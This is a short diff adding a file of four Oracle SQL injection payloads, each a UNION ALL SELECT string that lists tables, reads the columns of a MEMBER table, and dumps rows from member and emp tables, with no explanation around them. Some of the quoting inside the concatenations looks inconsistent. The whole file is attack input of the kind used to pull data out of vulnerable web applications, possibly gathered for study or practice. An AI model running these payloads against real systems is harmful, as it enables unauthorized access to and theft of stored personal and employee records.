@@ -1,0 +1,7 @@
+' union all select tname,'0','0','0','0' from tab--
+
+' union all select column_name,'0','0','0','0' from user_tab_cols where table_name='MEMBER' --
+
+' union all select name,age||',gender,'0','0' from member --
+
+' union all select ename,empno||",job, to_char(hiredate,'yyyy-mm-dd'),'0' from emp --
